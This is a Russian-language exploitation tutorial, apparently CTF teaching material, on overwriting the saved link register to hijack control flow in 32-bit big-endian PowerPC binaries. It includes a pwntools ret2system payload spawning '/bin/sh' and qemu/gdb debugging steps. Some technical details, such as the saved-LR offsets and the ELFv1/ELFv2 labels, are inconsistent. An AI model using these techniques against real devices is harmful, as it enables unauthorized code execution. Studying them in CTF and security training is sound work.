## Вопрос, с которого всё начинается

Ты уверенно строишь ROP для x86-64. Но перед тобой бинарь для **PowerPC** —
архитектуры, которая живёт в сетевом оборудовании, автомобильных блоках и
старых игровых приставках. Привычный приём «перезаписать адрес возврата на
стеке» здесь выглядит иначе: функция не кладёт адрес возврата на стек при
вызове. Как тогда ломать?

Разберём ABI PowerPC по шагам и посмотрим, что именно перезаписывается.

## Наш пример

```
$ file ppc.elf
ppc.elf: ELF 32-bit MSB relocatable, PowerPC or cisco 4500
$ readelf --file-header ppc.elf
  Class:                             ELF32
  Data:                              2's complement, big endian
  Machine:                           PowerPC
```

Два факта: разрядность **32 бита**, порядок байт **big-endian** (MSB). Уже из
этого следует, что все адреса в payload надо упаковывать как `p32`, но
«перевёрнутые» — старший байт первым. В pwntools для этого есть `context.endian`.

## Шаг 1: как PowerPC возвращается из функции

Посмотрим на реальный листинг (`ppc.s`):

```
f:
	stwu 1, -16(1)
	stw 31, 12(1)
	mr	31, 1
	lwz 3, 8(31)
	addi 3, 3, 1
	lwz 31, 12(1)
	addi 1, 1, 16
	blr
```

Здесь `1` — это регистр `r1`, а `31` — `r31`. Ключевая инструкция в конце —
**`blr`** (Branch to Link Register): возврат по адресу, лежащему в специальном
регистре **LR** (Link Register). Обычный вызов `bl` (Branch and Link) кладёт
адрес возврата именно в LR — а не на стек.

Отсюда важный вывод: в **leaf-функции** (которая никого не вызывает) адрес
возврата вообще не попадает на стек. В нашем примере `f` — leaf, поэтому LR не
сохраняется.

## Шаг 2: где же адрес возврата в реальной функции

Возьмём функцию, которая вызывает другую:

```
foo:
	mflr 0            # r0 = LR
	stwu 1, -32(1)    # открыть кадр
	stw 0, 36(1)      # сохранить LR на стек
	...
	lwz 0, 36(1)      # восстановить LR
	mtlr 0            # LR = r0
	addi 1, 1, 32
	blr
```

Вот тут и появляется стек. Пролог делает `mflr r0` (Move From Link Register) и
сохраняет LR на стек (`stw 0, 36(1)`), а эпилог восстанавливает его и возвращает
управление через `blr`.

**Это и есть точка атаки.** Переполнив буфер, мы доходим до сохранённого на
стеке LR и перезаписываем его адресом нашей цели. После `mtlr` и `blr` процессор
прыгнет туда, куда мы указали. Техника ровно та же, что ret2win, только вместо
`ret` работает `blr`, а «адрес возврата» лежит по конкретному смещению от `r1`.

## Шаг 3: смещение до сохранённого LR

В отличие от x86, где адрес возврата лежит сразу над сохранённым `ebp`, на
PowerPC смещение зависит от размера кадра. В примере выше LR сохранён по
`36(r1)` при кадре 32 байта. Значит, offset до LR = размер буфера + выравнивание
до этой позиции. Ищем так же, как везде:

```
$ ROPgadget --binary challenge --rawArch=ppc --rawMode=32 | head
```

или, если `ROPgadget` не знает целевую архитектуру, используем `objdump -d` из
кросс-тулчейна (`powerpc-linux-gnu-objdump`) и ищем смещение вручную.

## Шаг 4: TOC и r2 — почему ROP на ppc64 сложнее

В 64-битном PowerPC (ELFv1, big-endian) функции вызываются не напрямую, а через
**дескрипторы функций**, лежащие в **TOC** (Table of Contents). Регистр `r2`
всегда указывает на TOC, и пролог функции часто его подгружает. Поэтому гаджет,
вызывающий функцию, должен сначала выставить `r2` в правильное значение — иначе
адрес функции будет прочитан неверно.

В 32-битном PowerPC такой проблемы нет: адреса прямые, и ROP строится как
цепочка «адрес → адрес → ...». Наш пример — как раз 32-битный, поэтому начнём с
простого.

## Шаг 5: гаджеты PowerPC

Ищем по тем же правилам: последовательность инструкций, заканчивающаяся
переходом по регистру (`blr`) или косвенным переходом. Пример цепочки для вызова
`system` в 32-битном режиме:

```
[ offset ] + [ адрес system ] + [ адрес "/bin/sh" ]
```

Так как ABI PowerPC передаёт первый аргумент в `r3`, а «следующая» инструкция
после `blr` не читает стек автоматически, порядок гаджетов подбирается вручную:
часто нужен `pop r3`-подобный гаджет (`lwz 3, ...; blr`), чтобы загрузить
указатель на строку.

## Шаг 6: собираем эксплойт

```python
from pwn import *
context.arch = 'powerpc'
context.endian = 'big'
p = process('./challenge')
offset = 44
payload  = b'A' * offset
payload += p32(system_addr)     # перезаписанный LR
payload += b'B' * 4             # заглушка
payload += p32(binsh_addr)      # аргумент в r3 (если гаджет подгрузит)
p.sendline(payload)
p.interactive()
```

Обрати внимание на `context.endian = 'big'` — иначе `p32` упакует адрес
little-endian, и на big-endian цели он окажется перевёрнутым.

## Шаг 7: big-endian и утечки

Big-endian ломает привычки: при утечке указателя байты приходят в порядке
«старший первым». При разборе дампа это надо учитывать — то, что на x86 было бы
`b8 ce f7 f7 ff 7f 00 00`, на PowerPC придёт как `00 00 7f ff f7 f7 ce b8`.
Частая ошибка новичка — распарсить утечку как little-endian и получить «мусор».

## Что мы теперь знаем

- PowerPC возвращается через `blr` по регистру LR, а не через `ret` со стека.
- Адрес возврата сохраняется на стек только в не-leaf функциях (`mflr`/`mtlr`).
- 32-битный PowerPC — прямые адреса; 64-битный требует корректного `r2` (TOC).
- Порядок байт big-endian: адреса упаковываем с учётом endianness.

## Полный листинг и сохранение LR

PowerPC возвращается через регистр **LR** (link register). Не-leaf функция
обязана сохранить его на стек:

```
vuln:
    mflr    r0                 ; r0 = LR
    stw     r0, 8(r1)          ; сохраняем LR на стек (r1 = SP)
    stwu    r1, -64(r1)        ; выделяем кадр, обновляем SP
    ...
    addi    r1, r1, 64
    lwz     r0, 8(r1)          ; восстанавливаем LR
    mtlr    r0
    blr                        ; branch to LR
```

`mflr r0` / `mtlr r0` — «move from/to link register». `blr` — «branch to link
register», то есть возврат. Сохранённый LR лежит по смещению `8(r1)` — это
стандартный слот PowerPC ABI. Переполнив буфер до этого слота, мы забираем
управление. На 64-битном POWER/PPC64 используется `std`/`ld` (8 байт) вместо
`stw`/`lwz`.

## TOC и r2 на ppc64

Отдельная сложность PPC64 (ELFv2) — **TOC** (Table of Contents), указатель на
которую лежит в `r2`. Многие функции обращаются к глобальным данным и вызовам
через `r2`; если при ROP не восстановить правильный `r2`, вызов упадёт. Поэтому
на ppc64 перед прыжком в сложную функцию нужно либо прыгать на «TOC-less»
гаджет, либо загрузить `r2` из известного места. На 32-битном PPC этой проблемы
нет — там GOT-адресация проще, и ROP строится почти как на ARM.

## Паттерн и упаковка

```
$ python3 -c "from pwn import *; context.arch='powerpc'; context.endian='big'; print(cyclic(128))"
$ qemu-ppc -g 1234 ./challenge &
$ gdb-multiarch ./challenge -ex 'target remote :1234' -ex c
Program received signal SIGSEGV
(gdb) info registers lr
lr   0x61616161
```

PowerPC big-endian: `p32(addr, endian='big')` для ppc32, `p64(..., endian='big')`
для ppc64. Проверь `readelf -h`: `Data: big endian`, `Machine: PowerPC`. Ошибка в
порядке байт — самая частая причина странного падения.

## Отладка PowerPC

Эмуляция: `qemu-ppc -L /usr/powerpc-linux-gnu ./challenge` (или `qemu-ppc64` /
`qemu-ppc64le` — суффикс `le` для little-endian POWER, который тоже встречается).
Отладка — `qemu-ppc -g <port>` + `gdb-multiarch`. `ROPgadget --arch ppc` и
`ropper --arch ppc` находят последовательности, оканчивающиеся `blr`. Помни про
delay-подобное поведение ветвей на старых ядрах и про то, что `blr` — не `ret`:
он не трогает стек, поэтому стековая миграция на PPC устроена иначе.

## Где встречается PowerPC

PPC живёт в сетевом оборудовании (Cisco, Juniper), в принтерах, в старых
Macintosh (до перехода на Intel) и в промышленных системах. Часто это big-endian
32-бит. Для пентеста это в первую очередь разбор прошивок и embedded-устройств.
Методология та же, что и на других RISC: найти регистр возврата (LR), вычислить
смещение до сохранённого слота, учесть big-endian и, на ppc64, восстановить TOC.

## Мини-чек-лист PowerPC

1. `readelf -h` → `big endian`, `Machine: PowerPC` (или `PowerPC64`).
2. `objdump -d` → найти `mflr r0` / `stw r0, 8(r1)` (сохранение LR).
3. Измерить смещение через `cyclic` (big-endian!).
4. Для ppc64 — убедиться, что выбранный гаджет не требует корректного `r2`.
5. Собрать payload `p32`/`p64` с `endian='big'`.

Пункт про `r2` — главный источник падений на ppc64: даже правильный адрес
функции упадёт, если TOC-указатель не восстановлен. Для простых win-функций без
глобальных обращений это неважно, но для `system`/`execve`-обёрток — критично.

## Куда дальше

Дальше — **SPARC**, где появляется ещё одна экзотика: окна регистров и delay
slot. А пока запомни: **на PowerPC возврат идёт через `blr` по LR, а сохранённый
LR на стеке — твоя точка перезаписи**.
